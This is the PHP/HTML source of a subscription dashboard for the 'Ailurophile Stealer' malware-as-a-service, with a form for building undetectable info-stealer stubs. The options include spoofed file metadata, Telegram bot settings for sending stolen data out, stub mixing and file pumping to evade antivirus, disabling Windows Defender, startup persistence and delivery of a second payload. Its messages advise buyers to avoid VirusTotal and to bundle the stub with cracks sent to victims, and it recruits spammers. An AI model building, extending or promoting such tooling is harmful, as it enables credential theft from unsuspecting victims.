<?php
session_start();
include __DIR__."/api/config.php";

if (!isset($_SESSION['user_id'])) {
    header("Location: /login");
    exit();
}

$user_id = $_SESSION['user_id'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($user) {
                $username = $user['username'];
				$role = $user['role'];
			}
			

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Ailurophile Stealer Dashboard</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="Ailurophile Stealer Dashboard" name="keywords">
    <meta content="Ailurophile Stealer Dashboard" name="description">

    <!-- Favicon -->
    <link href="ico.ico" rel="icon">

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&family=Roboto:wght@500;700&display=swap" rel="stylesheet"> 
    
    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet">

    <!-- Libraries Stylesheet -->
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet">
    <link href="lib/tempusdominus/css/tempusdominus-bootstrap-4.min.css" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="css/bootstrap.min.css" rel="stylesheet">

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet">
</head>

<body>
    <div class="container-fluid position-relative d-flex p-0">
        <!-- Spinner Start -->
        <div id="spinner" class="show bg-dark position-fixed translate-middle w-100 vh-100 top-50 start-50 d-flex align-items-center justify-content-center">
            <div class="spinner-border text-primary" style="width: 3rem; height: 3rem;" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
        <!-- Spinner End -->


        <!-- Sidebar Start -->
        <div class="sidebar pe-4 pb-3">
            <nav class="navbar bg-secondary navbar-dark">
                <a href="index.html" class="navbar-brand mx-4 mb-3">
                    <h3 class="text-primary"><i class="fa fa-cat"></i> Ailurophile</h3>
                </a>
                <div class="d-flex align-items-center ms-4 mb-4">
                    <div class="position-relative">
                        <img class="rounded-circle" src="cat.png" alt="" style="width: 40px; height: 40px;">
                        <div class="bg-success rounded-circle border border-2 border-white position-absolute end-0 bottom-0 p-1"></div>
                    </div>
                    <div class="ms-3">
                         <h6 class="mb-0"><?php echo $username;?></h6>
                        <span><?php  if($role==2){echo "Standard Member";} elseif($role==3){echo "Premium Member";} elseif($role==4){echo "VIP Member";} else{echo "New Member";}; ?></span>
                    </div>
                </div>
                <div class="navbar-nav w-100">
                    <a href="/dashboard" class="nav-item nav-link"><i class="fa fa-tachometer-alt me-2"></i>Dashboard</a>
                    <a href="/subscription" class="nav-item nav-link"><i class="fa fa-th me-2"></i>Subscription</a>
					<a href="/bot" class="nav-item nav-link"><i class="fa fa-keyboard me-2"></i>My Bots</a>
                    <a href="/settings" class="nav-item nav-link"><i class="fa fa-keyboard me-2"></i>Settings</a>
					<a href="/cookie" class="nav-item nav-link"><i class="fa fa-keyboard me-2"></i>Convert Cookie</a>
                    <a href="/ref" class="nav-item nav-link"><i class="fa fa-table me-2"></i>Referral program</a>
                </div>
            </nav>
        </div>
        <!-- Sidebar End -->


        <!-- Content Start -->
        <div class="content">
            <!-- Navbar Start -->
            <nav class="navbar navbar-expand bg-secondary navbar-dark sticky-top px-4 py-0">
                <a href="index.html" class="navbar-brand d-flex d-lg-none me-4">
                    <h2 class="text-primary mb-0"><i class="fa fa-user-edit"></i></h2>
                </a>
				                <a href="#" class="sidebar-toggler flex-shrink-0">
                    <i class="fa fa-bars"></i>
                </a>
				<div class="navbar-nav align-items-center ms-auto">
                                  <div class="nav-item dropdown">
                        <a href="#" class="nav-link dropdown-toggle" data-bs-toggle="dropdown">
                            <img class="rounded-circle me-lg-2" src="cat.png" alt="" style="width: 40px; height: 40px;">
                            <span class="d-none d-lg-inline-flex"><?php echo $username;?></span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end bg-secondary border-0 rounded-0 rounded-bottom m-0">
                            <a href="#" class="dropdown-item">My Profile</a>
                            <a href="#" class="dropdown-item">Settings</a>
                            <a href="/logout" class="dropdown-item">Log Out</a>
                        </div>
                    </div>
                </div>
            </nav>
            <!-- Navbar End -->

            <!-- Blank Start -->
     <div class="container-fluid pt-4 px-4">
                <div class="row g-4">
                    <div class="col-sm-12 col-xl-6">
                        <div class="bg-secondary rounded h-100 p-4">
                            <h6 class="mb-4">MAKE CRAZY FUD STEALER STUB EVERYDAY</h6>
                            <form>
								<h6 class="mb-4">Ailurophile Verion (Only for VIP member)</h6>
								<select name="verstub" id="verstub">
								<option value="v1" class="form-control">Version 1.4 - Run with console but long FUD</option>
								<option value="v2" class="form-control">Version 2.0 - Run with silently</option>
								</select>
								<h6 class="mb-4">Assembly Information</h6>
                                <div class="mb-3">
                                    <label class="form-label">Product Name</label>
                                    <input type="text" name="product_name" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>     
								<div class="mb-3">
                                    <label class="form-label">File description</label>
                                    <input type="text" name="file_description" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>   
								<div class="mb-3">
                                    <label class="form-label">File Version (1.0.0.1)</label>
                                    <input type="text" name="file_version" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div> 
								<div class="mb-3">
                                    <label class="form-label">Product Version (1.0)</label>
                                    <input type="text" name="product_version" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>
								<div class="mb-3">
                                    <label class="form-label">Copyright</label>
                                    <input type="text" name="copyright" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>
								<div class="mb-3">
                                    <label class="form-label">Legal Trademarks</label>
                                    <input type="text" name="legal_trademarks" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>
								<div class="mb-3">
                                    <label class="form-label">Original Filename</label>
                                    <input type="text" name="original_filename" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>
								 <div class="mb-3">
                                <label for="formFile" class="form-label">Icon (.ico only)</label>
                                <input class="form-control bg-dark" type="file" id="formFile" name="icon" <?php if($role=="1"){echo "disabled";} ?>>
								</div>
								<h6 class="mb-4">Telegram notify</h6>
								<div class="mb-3">
                                    <label class="form-label">Bot token</label>
                                    <input type="text" name="bot_token" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>
								<div class="mb-3">
                                    <label class="form-label">Chat id</label>
                                    <input type="text" name="chat_id" class="form-control" <?php if($role=="1"){echo "disabled";} ?>>
                                </div>

										<br>
								<h6 class="mb-4">Other options (Premium only)</h6>
                                        <div class="form-check">
                                            <input class="form-check-input" name="mix_stub" type="checkbox" id="gridCheck2" <?php if($role=="1" or $role=="2"){echo "disabled";} ?>>
                                            <label class="form-check-label" for="gridCheck2">
                                                Mix stub for long FUD
                                            </label>
                                        </div>
										<div class="form-check">
                                            <input class="form-check-input" name="pump_file" type="checkbox" id="gridCheck3" <?php if($role=="1" or $role=="2"){echo "disabled";} ?>>
                                            <label class="form-check-label" for="gridCheck3">
                                                Pump file
                                            </label>
                                        </div>
										<br>
										<h6 class="mb-4">Delivery (VIP only)</h6>
                                        <div class="form-check">
                                            <input class="form-check-input" name="disable_wd" type="checkbox" id="gridCheck1" <?php if($role<>"4"){echo "disabled";} ?>>
                                            <label class="form-check-label" for="gridCheck1">
                                                Disable windows defender
                                            </label>
                                        </div>


								         <div class="form-check">
                                            <input class="form-check-input" name="startup" type="checkbox" id="gridCheck4" <?php if($role<>"4"){echo "disabled";} ?>>
                                            <label class="form-check-label" for="gridCheck4">
                                                Startup
                                            </label>
                                        </div>
										<br>		
																			<div class="mb-3">
                                    <label class="form-label">Url other stub (.exe) for delivery (leave it null if dont use)</label>
                                    <input type="text" name="url_stub" class="form-control" <?php if($role<>"4"){echo "disabled";} ?> >
                                </div>	
																				<br>
                                <button type="submit" class="btn btn-primary">Make stub</button>
                            </form>
                        </div>
                    </div>
                    <div class="col-sm-12 col-xl-6">
                       <div class="bg-secondary rounded h-100 p-4">
                            <h6 class="mb-4">Read carefully before making stub</h6>
                            <dl class="row mb-0">
							    <dt class="col-sm-4">About free trial</dt>
                                <dd class="col-sm-8">Free trial will have stub for testing how the stealer working. It can be detected by Antivirus. If you want FUD, please buy package.</dd>

                                <dt class="col-sm-4">Assemly information</dt>
                                <dd class="col-sm-8">If you enter the incorrect format or leave any line blank, the system will automatically set that line to null. </dd>

                                <dt class="col-sm-4">Telegram notify</dt>
                                <dd class="col-sm-8">Please enter the bot token and chat ID in the correct format. If you don't know what it is, contact support for assistance.</dd>

                                <dt class="col-sm-4">Mix stub and pumpfile</dt>
                                <dd class="col-sm-8">Normally, the stub can last for over 15 days depending on the situation; if you mix the stub and pumpfile, it can last up to one month.</dd>

                                <dt class="col-sm-4 text-truncate">Disable WD and delivery</dt>
                                <dd class="col-sm-8">Disabling Windows Defender may not work in some cases, and delivery may cause the stub to be detected.</dd>
                            </dl>
                        </div>       </div>
                </div>
            </div>
			
			<div class="modal fade" id="loadingModal" tabindex="-1" aria-labelledby="loadingTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content bg-dark text-white text-center">
      <div class="modal-body">
        <div class="spinner-border text-light" role="status">
          <span class="visually-hidden">Loading...</span>
        </div>
        <p class="mt-3">Processing, please wait...</p>
      </div>
    </div>
  </div>
</div>
      <!-- Modal -->
<div class="modal fade" id="resultModal" tabindex="-1" aria-labelledby="modalTitle" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content bg-dark text-white"> <!-- Thêm lớp bg-dark và text-white để chuyển sang theme dark -->
      <div class="modal-header border-bottom border-secondary">
        <h5 class="modal-title" id="modalTitle"></h5>
        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <p id="modalMessage"></p>
      </div>
      <div class="modal-footer border-top border-secondary">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>


<!-- Modal Thông Báo -->
<div class="modal fade" id="telegramModal" tabindex="-1" aria-labelledby="telegramModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content bg-dark text-white"> 
            <div class="modal-header border-bottom border-secondary">
                <h5 class="modal-title" id="telegramModalLabel">Thông Báo</h5>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
              <p>Please follow our Telegram: <a href="https://t.me/ailurophilestealer" target="_blank">@Ailurophilestealer</a> to receive the latest updates.</p>
<p>🚀 We are looking for partners capable of dropping/spamming our FUD Stealer! 🚀 Contact <a href="https://t.me/Ailurophilevn" target="_blank">@Ailurophilevn</a> to register and discuss details.</p>
            </div>
            <div class="modal-footer border-top border-secondary">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
            </div>
        </div>
    </div>
</div>



            <!-- Blank End -->


            <!-- Footer Start -->
            <div class="container-fluid pt-4 px-4">
                <div class="bg-secondary rounded-top p-4">
                    <div class="row">
                        <div class="col-12 col-sm-6 text-center text-sm-start">
                            &copy; <a href="#">Ailurophile Stealer</a>, All Right Reserved. Telegram support: @Ailurophilevn
                        </div>
                    </div>
                </div>
            </div>
            <!-- Footer End -->
        </div>
        <!-- Content End -->


        <!-- Back to Top -->
        <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>
    </div>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="lib/chart/chart.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/waypoints/waypoints.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/tempusdominus/js/moment.min.js"></script>
    <script src="lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>
</body>

<?php

if (isset($_SESSION['just_logged_in']) && $_SESSION['just_logged_in'] === true) {
    // Reset cờ sau khi hiển thị thông báo
    $_SESSION['just_logged_in'] = false;
    echo '<script type="text/javascript">
        $(document).ready(function() {
            $("#telegramModal").modal("show");
        });
    </script>';
}


?>
<script>
$(document).ready(function() {
    $('form').on('submit', function(e) {
        e.preventDefault(); // Ngăn không cho form gửi đi theo cách thông thường

        var formData = new FormData(this); // Lấy toàn bộ dữ liệu từ form

        $.ajax({
            url: '/api/makestub.php',
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            beforeSend: function() {
                // Hiển thị modal loading trước khi bắt đầu gửi AJAX
                $('#loadingModal').modal('show');
            },
            success: function(response) {
                // Ẩn modal loading khi có kết quả
                $('#loadingModal').modal('hide');

                // Chuyển đổi JSON response thành object
                var result = JSON.parse(response);

                // Kiểm tra trạng thái và hiển thị thông báo lên modal
                if (result.status === 'success') {
                    $('#modalTitle').text('Success');
$('#modalMessage').html('Link download will expire within 60 minutes. DO NOT UPLOAD FILE TO VIRUSTOTAL FOR LONG FUD STUB. Password for extract: ' + result.password + ' - Download link: <a href="' + result.message + '">Download</a><br><br>After extracting, please rename the file and add .exe to the end. We do not include the .exe extension by default as it may be flagged by SmartScreen when downloaded via the internet. When sending the stub to the victim, please include it with other files, such as a crack/keygen program or other large files, to achieve the best result. We are working on adding a sign feature to avoid this inconvenience. Thank you for your understanding.');

                } else {
                    $('#modalTitle').text('Error');
                    $('#modalMessage').text(result.message);
                }

                // Hiển thị modal kết quả
                $('#resultModal').modal('show');
            },
            error: function(xhr, status, error) {
                // Ẩn modal loading khi xảy ra lỗi
                $('#loadingModal').modal('hide');

                $('#modalTitle').text('Error');
                $('#modalMessage').text('An unexpected error occurred: ' + error);
                $('#resultModal').modal('show');
            }
        });
    });
});

</script>
</html>